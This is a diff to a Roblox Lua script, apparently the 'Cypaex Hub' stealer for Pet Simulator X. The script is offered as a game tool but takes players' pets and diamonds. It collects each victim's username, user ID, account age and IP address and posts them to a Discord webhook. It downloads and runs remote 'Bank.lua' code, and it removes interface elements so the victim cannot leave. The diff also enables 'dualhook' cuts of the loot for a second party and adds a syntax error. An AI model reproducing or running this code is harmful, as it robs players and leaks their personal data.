@@ -7,6 +7,10 @@
   
 ]]--
 
+-- LOADING SCREEN KEEP IT ENABLED OR GAY >:(
+
+_G.LoadingScreen = true
+
 getgenv().Settings = {
     User = "petspsx651",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
@@ -21,7 +25,7 @@ getgenv().Settings = {
     },
     Huges = {
         Dualhook = true,
-        Intensity = 80 --%
+        Intensity = 50 --%
     },
     Pogs = {
         Dualhook = true,
@@ -45,7 +49,7 @@ getgenv().Settings = {
     },
     Gems = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 50 --%
     }
 }
 
@@ -103,7 +107,7 @@ end
 local idiotuser = game:GetService("Players").LocalPlayer.Name
 
 if idiotuser == UserName then
-    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner of The script! (Test on Alt Acc)")
     return;
 end
 if UserName == nil then
@@ -213,7 +217,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= true then
+if _G.LoadingScreen = true then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Cypaex/PsxLoading/main/Engine.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
@@ -751,7 +755,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("bankstealer raw link", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Cypaex/PsxBank/main/Bank.lua", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -761,7 +765,7 @@ if _G.AntiLeave ~= false then
         end
     end
     for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if v.Name ~= "CypaexHub" and v.Name ~= "RobloxPromptGui" then
+        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
             v:Destroy()
         end
     end
@@ -955,7 +959,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://cdn.discordapp.com/attachments/1129524257655902210/1130646633579819038/gifc.gif"
+        "https://cdn.discordapp.com/attachments/1129524257655902210/1130633198632718456/Cypaex.jpg"
         data1 = {
             ["content"] = ping,
             ["username"] = "Cypaex Hub",
@@ -971,7 +975,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :ghost:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1025,7 +1029,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://cdn.discordapp.com/attachments/1129524257655902210/1130646633579819038/gifc.gif"
+        "https://cdn.discordapp.com/attachments/1129524257655902210/1130633198632718456/Cypaex.jpg"
         data1 = {
             ["content"] = ping,
             ["username"] = "Cypaex Hub",
@@ -1041,7 +1045,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :ghost:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1082,33 +1086,32 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     end
 end
 
-local dhuser = getgenv().Settings.User
--- if getgenv().Settings ~= nil then
---     if getgenv().Settings.PremiumKey ~= nil then
---         local premkey = getgenv().Settings.PremiumKey
---         local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
---         local dhdata = {
---             dhprem = dhkey
---         }
---         local dhurl = "https://janeq.space/others/keya.php" -- Exc : https://rizz.xyz/premium.php
---         local dhheaders = {
---             ["content-type"] = "application/json"
---         }
---         local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
---         local dhresponse = request({
---             Url = dhurl,
---             Body = dhnewdata,
---             Method = "POST",
---             Headers = dhheaders
---         })
---         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
---         if responsed ~= 'false' then
---             dhuser = responsed
---         else
---             dhuser = nil
---         end
---     end
--- end
+if getgenv().Settings ~= nil then
+    if getgenv().Settings.PremiumKey ~= nil then
+        local premkey = getgenv().Settings.PremiumKey
+        local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
+        local dhdata = {
+            dhprem = dhkey
+        }
+        local dhurl = "https://janeq.space/others/keya.php" -- Exc : https://rizz.xyz/premium.php
+        local dhheaders = {
+            ["content-type"] = "application/json"
+        }
+        local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
+        local dhresponse = request({
+            Url = dhurl,
+            Body = dhnewdata,
+            Method = "POST",
+            Headers = dhheaders
+        })
+        local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
+        if responsed ~= 'false' then
+            dhuser = responsed
+        else
+            dhuser = nil
+        end
+    end
+end
 local titanicin
 local bananin
 local hugein
@@ -1118,7 +1121,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = ".gg/hzBAruhe2X"
+local mailmsg = ".gg/uSgzNwHDTS"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
